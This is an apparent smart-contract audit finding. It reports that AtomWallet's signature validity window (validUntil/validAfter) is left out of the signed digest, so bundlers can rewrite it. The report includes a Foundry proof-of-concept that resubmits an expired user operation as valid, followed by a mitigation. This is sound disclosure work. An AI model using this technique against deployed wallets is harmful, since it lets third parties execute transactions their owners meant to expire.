# [M] `validUntil` And `validAfter` Can Be Manipulated By Bundler Or Relayer

## Summary

In `AtomWallet`, the validity window (`validUntil` / `validAfter`) is appended to the ECDSA signature blob but never
included in the signed digest. Because these 12 bytes fall outside the cryptographic commitment, **any bundler or
relayer can silently overwrite them** — the 65-byte ECDSA component remains valid and address recovery still returns
`owner()`.

## Description

### Normal Behavior

When an `AtomWallet` owner wants to restrict a UserOperation to a specific time window, they produce a 77-byte
signature: \[standard 65-byte ECDSA signature\]\[validUntil\]\[validAfter\]. The `EntryPoint` is then expected to
enforce that the operation only executes within that window.

### The Bug

https://github.com/code-423n4/2026-03-intuition/blob/314b7d4d9ccbaf27e4484a6c0706af83d3f75f36/src/protocol/wallet/AtomWallet.sol#L294-L310

```solidity
// File: src/protocol/wallet/AtomWallet.sol
function _validateSignature(...) {
    // validUntil / validAfter are parsed from trailing bytes — never hashed
@>  (uint48 validUntil, uint48 validAfter, bytes memory signature) =
      _extractValidUntilAndValidAfterFromSignature(userOp.signature);

    bytes32 hash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", userOpHash));
    // hash covers only userOpHash — the validity window is entirely absent
@>  (address recovered, ECDSA.RecoverError recoverError, bytes32 errorArg) =
        ECDSA.tryRecover(hash, signature);

    //...

    bool sigFailed = recovered != owner();
    // window returned to EntryPoint comes from unverified bytes
@>  return _packValidationData(sigFailed, validUntil, validAfter);
}
```

\_extractValidUntilAndValidAfterFromSignature reads bytes \[65:77\] of the signature blob. However, `userOpHash` — the
only thing the signer commits to — is computed independently of those trailing bytes. The 12-byte suffix is never
hashed, so rewriting it leaves `recovered` completely unchanged.

## Impact

- Time-sensitive UserOps can be executed long after the owner intended, letting a bundler choose the most favorable
  moment.
- Owners can no longer rely on expiry for safety; if they want to stop execution after the intended window, they must
  send a separate cancellation transaction.

## Likelihood

- No special funds or elevated privileges are required; the cost is effectively zero.
- The attacker can be the bundler, a relayer, or anyone who can intercept and re-submit the UserOp before the EntryPoint
  processes it.
- Requires the owner to have used the time-window signature format (77 bytes). Plain 65-byte signers are unaffected.

## Proof of Concept

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.29;

import {BaseTest} from "./BaseTest.t.sol";
import {ITrustBonding} from "src/interfaces/ITrustBonding.sol";
import {AtomWallet} from "src/protocol/wallet/AtomWallet.sol";
import {PackedUserOperation} from "@account-abstraction/interfaces/PackedUserOperation.sol";
import {_packValidationData} from "@account-abstraction/core/Helpers.sol";

contract PoCCore is BaseTest {
    function test_submissionValidity() external {
        (address dave, uint256 daveKey) = makeAddrAndKey("dave");
        vm.deal(dave, 1 ether);
        vm.warp(block.timestamp + 1000);

        // 1) Dave creates an atom
        createAtomWithDeposit(bytes("dave-atom"), 1 ether, dave);

        // 2) Deploy the AtomWallet for Dave's atom
        bytes32 atomId = calculateAtomId(bytes("dave-atom"));
        address daveAtomWalletAddr = protocol.atomWalletFactory.deployAtomWallet(atomId);
        AtomWallet daveAtomWallet = AtomWallet(payable(daveAtomWalletAddr));

        // 3) ATOM_WARDEN initiates 2-step ownership transfer to dave
        resetPrank(ATOM_WARDEN);
        daveAtomWallet.transferOwnership(dave);

        // 4) Wallet accepts ownership
        resetPrank(dave);
        daveAtomWallet.acceptOwnership();

        // 5) Fund the wallet with some ether
        uint256 walletInitialBalance = 1 ether;
        vm.deal(daveAtomWalletAddr, walletInitialBalance);

        //6) Create a valid UserOperation with a valid signature but an expired validUntil timestamp
        PackedUserOperation memory userOp = _createValidUserOp(daveAtomWalletAddr);
        bytes32 userOpHash = keccak256(abi.encode(userOp));

        uint48 validUntil = uint48(block.timestamp - 50);
        uint48 validAfter = uint48(block.timestamp - 100);
        userOp.signature = _signUserOpHashWithTimeWindow(daveKey, userOpHash, validUntil, validAfter);

        //7) Bundler modify the UserOperation to have a valid time window before submitting to the EntryPoint
        validUntil = uint48(block.timestamp + 100);
        validAfter = uint48(block.timestamp - 100);
        bytes memory rawSignature = new bytes(65);
        for (uint256 i = 0; i < 65; i++) {
            rawSignature[i] = userOp.signature[i];
        }
        userOp.signature = abi.encodePacked(rawSignature, validUntil, validAfter);

        //8) AtomWallet accept the modified UserOperation
        resetPrank(ENTRY_POINT);
        uint256 validationData = daveAtomWallet.validateUserOp(userOp, userOpHash, 0);
        uint256 expectedValidationData = _packValidationData(false, validUntil, validAfter);

        assertEq(validationData, expectedValidationData, "FAIL");
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    function _createValidUserOp(address atomWallet) internal view returns (PackedUserOperation memory) {
        bytes memory callData = abi.encodeWithSelector(
            AtomWallet.execute.selector,
            users.bob, // target
            0, // value
            "" // data
        );

        return
            PackedUserOperation({
                sender: address(atomWallet),
                nonce: 0,
                initCode: "",
                callData: callData,
                accountGasLimits: bytes32((uint256(1_000_000) << 128) | 1_000_000),
                preVerificationGas: 21_000,
                gasFees: bytes32((uint256(1_000_000_000) << 128) | 1_000_000_000),
                paymasterAndData: "",
                signature: ""
            });
    }

    function _signUserOpHash(uint256 signerPrivateKey, bytes32 userOpHash) internal returns (bytes memory) {
        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", userOpHash));
        (uint8 signatureV, bytes32 signatureR, bytes32 signatureS) = vm.sign(signerPrivateKey, ethSignedMessageHash);
        return abi.encodePacked(signatureR, signatureS, signatureV);
    }

    function _signUserOpHashWithTimeWindow(
        uint256 signerPrivateKey,
        bytes32 userOpHash,
        uint48 validUntil,
        uint48 validAfter
    ) internal returns (bytes memory) {
        bytes memory rawSignature = _signUserOpHash(signerPrivateKey, userOpHash);
        return abi.encodePacked(rawSignature, validUntil, validAfter);
    }
}
```

## Recommended Mitigation

Incorporate `validUntil` and `validAfter` into the digest, so any mutation of the trailing bytes invalidates the
recovered address.
